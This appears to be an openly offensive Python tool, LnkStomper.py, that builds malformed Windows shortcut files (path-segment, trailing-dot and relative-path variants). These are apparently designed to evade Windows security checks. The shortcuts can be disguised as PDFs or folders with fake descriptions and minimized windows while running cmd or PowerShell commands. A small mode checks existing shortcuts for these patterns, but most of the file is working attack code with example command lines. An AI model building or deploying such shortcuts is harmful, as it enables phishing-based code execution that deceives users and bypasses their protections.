# LnkStomper.py
import subprocess
import argparse
import os
from datetime import datetime
import winlnks


def segment_from_path(path):
    entry = winlnks.PathSegmentEntry()
    entry.type = winlnks.TYPE_FILE
    now = datetime.now()
    entry.file_size = 0
    entry.modified = now
    entry.created = now
    entry.accessed = now
    entry.short_name = path
    entry.full_name = path
    return entry

def add_args_icon(lnk, arguments, icon):

    if arguments:
        lnk.link_flags.HasArguments = True
        lnk.arguments = arguments
    if icon:
        lnk.link_flags.HasIconLocation = True
        if icon == "folder":
            lnk.icon = "c:\\windows\\System32\\SHELL32.dll"
            lnk.icon_index = 3
        elif icon == "pdf":
            lnk.icon = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
            lnk.icon_index = 13
        else:
            icon = icon.replace("\\","\\\\")

            if "," in icon:
                nicon =  icon.split(",")[0]
                
                #index = icon.split(",")[1]
                indexx = int(icon.split(",")[1])
                
                lnk.icon_index = indexx
                lnk.icon = nicon
                print(f"Icon {nicon}\nIndex {indexx}")
            else:
                lnk.icon = icon
                print(f"Icon {icon}")

    

def generate_pathsegment(output, exe, arguments=None, icon=None):
    lnk = winlnks.create(output)
    lnk.link_flags.IsUnicode = True
    lnk.link_flags.HasLinkInfo = True
    levels = list(winlnks.path_levels(exe))
    elements = [winlnks.RootEntry(winlnks.ROOT_MY_COMPUTER),
                winlnks.DriveEntry(levels[0])]
    path = "\\".join(exe.split("\\")[1:])
    segment = segment_from_path(path)
    elements.append(segment)
    lnk.shell_item_id_list = winlnks.LinkTargetIDList()
    lnk.specify_local_location(exe, winlnks.DRIVE_FIXED, 2819051173)
    lnk.shell_item_id_list.items = elements
    lnk.description = lnkdesc
    lnk.window_mode = windows
    
    add_args_icon(lnk, arguments, icon)
    
    print(f"\n[+] OUTPUT : {get_path(output)}")
    lnk.save()

def normal_lnk():
    pass

def generate_dot(output, exe, arguments=None, icon=None):
    exe += "."
    lnk = winlnks.create(output)
    lnk.link_flags.IsUnicode = True
    lnk.link_flags.HasLinkInfo = True
    levels = list(winlnks.path_levels(exe))
    elements = [winlnks.RootEntry(winlnks.ROOT_MY_COMPUTER),
                winlnks.DriveEntry(levels[0])]
    for level in levels[1:]:
        segment = winlnks.PathSegmentEntry.create_for_path(level)
        elements.append(segment)            
    lnk.shell_item_id_list = winlnks.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements
    lnk.specify_local_location(exe, winlnks.DRIVE_FIXED, 2819051173)

    
    lnk.description = lnkdesc
    lnk.window_mode = windows

    add_args_icon(lnk, arguments, icon)
    
    
    print(f"\n[+] OUTPUT : {get_path(output)}")
    lnk.save()

def generate_relative(output, exe, arguments=None, icon=None):
#    if "\\" in exe:
#        print("Only supply exe name for relative variant")
#        return
    lnk = winlnks.create(output)
    lnk.link_flags.IsUnicode = True
    lnk.link_flags.HasLinkInfo = True
    levels = list(winlnks.path_levels(exe))
    elements = [winlnks.RootEntry(winlnks.ROOT_MY_DOCUMENTS)]
    for level in levels[1:]:
        segment = winlnks.PathSegmentEntry.create_for_path(level)
        elements.append(segment)
    lnk.shell_item_id_list = winlnks.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements
    lnk.specify_local_location(exe, winlnks.DRIVE_FIXED, 2819051173)
    lnk._set_relative_path(f".\\{exe}")
    
    lnk.description = lnkdesc
    lnk.window_mode = windows

    add_args_icon(lnk, arguments, icon)

    print(f"\n[+] OUTPUT: {get_path(output)}")
    lnk.save()

def computer_root(lnk):
    for item in lnk.shell_item_id_list.items:
        if type(item) == winlnks.RootEntry:
            return item.root == "MY_COMPUTER" or item.root == "USERPROFILE"

def pathseg_vuln(lnk):
    for item in lnk.shell_item_id_list.items:
        if type(item) == winlnks.PathSegmentEntry:
            if item.full_name and item.full_name.count("\\") >= 2:
                return True

def get_path(file):
    if os.path.exists(file):
        return os.path.abspath(file)

def has_vuln(path):
    #print("Warning: FPs or FNs are possible")
    try:
        lnk = winlnks.parse(path)
        lnkpath = os.path.abspath(lnk.file)
        target = lnk.path
        arg = lnk.arguments
        desc = lnk.description
        icon = lnk.icon
        index = lnk.icon_index
        window = lnk.window_mode
        dir = lnk.work_dir
        if icon == None: icon = target

        print(f"""
[+] {lnkpath}\n
Target\t\t: {target}
Arguments\t: {arg}
Description\t: {desc}
Icon\t\t: {icon},{index}
Window\t\t: {window}
Directory\t: {dir}
""")
        
        
        lnk.path.endswith(".")
        if lnk.path.endswith(".") or lnk.path.endswith(" "):
            print(f"[$] Exploiting  (dot\\space)")
            return True
        elif lnk.relative_path and lnk.relative_path.startswith(".\\") and lnk.relative_path.count("\\") == 1 and not computer_root(lnk):
            print(f"[$] Exploiting  (relative)") 
            return True
        elif pathseg_vuln(lnk):
            print(f"[$] Exploiting  (pathsegment)")
        
    except:
        print(f"Exception while processing {path}")

def help():
    print(rf"""
python LnkStomper.py --lnk calc.lnk
python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c start calc.exe" -o calc.lnk
python lnkstomper.py --target C:\Windows\System32\cmd.exe --arguments "/c powershell.exe -c calc" --icon pdf --output calc.lnk          
python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c powershell.exe -c start calc" -o calc.lnk -i pdf -d "Pdf Document" -w min
python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c powershell.exe -c start calc" -o calc.lnk  -w min -i "%SystemRoot%\System32\shell32.dll,267"
python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c start calc.exe" -o calc.lnk -v dot
python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c start calc.exe" -o calc.lnk -v pathsegent
""")
    


def main():

    if args.lnk:
        has_vuln(args.lnk)
        return

    
    if args.example:
        help()
        return        
        
    if not args.target:
        print("--target is a required parameter")
        return


    if args.variant == "pathsegment":
        generate_pathsegment(args.output, args.target, args.arguments, args.icon)
    elif args.variant == "dot":
        generate_dot(args.output, args.target, args.arguments, args.icon)
    elif args.variant == "relative":
        generate_relative(args.output, args.target, args.arguments, args.icon)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-e",'--example', help='Example commands',action="store_true")
    parser.add_argument('--lnk', help='Input LNK for vuln check')
    parser.add_argument('--output',"-o", help='Output link file name', default=r'poc.lnk')
    parser.add_argument('--target',"-t", help='Target Path', type=str)
    parser.add_argument('--arguments',"-a", help='Arguments to target', type=str)
    parser.add_argument('--icon',"-i", help='Icon to use')
    parser.add_argument('--description',"-d", help='Description to use')
    parser.add_argument('--window',"-w", help='Windows Style', choices=["max","min","normal"])
    parser.add_argument('--variant',"-v", help='Attack variant to use', choices=['pathsegment', 'dot', 'relative'], default='pathsegment')
    args = parser.parse_args()

    if not args.description:
        lnkdesc = "Document"
    else:
        lnkdesc = args.description

    if args.window == "max":
        windows = "Maximized"
    elif args.window == "min":
        windows = "Minimized"
    else:
        windows = "Normal"
    main()
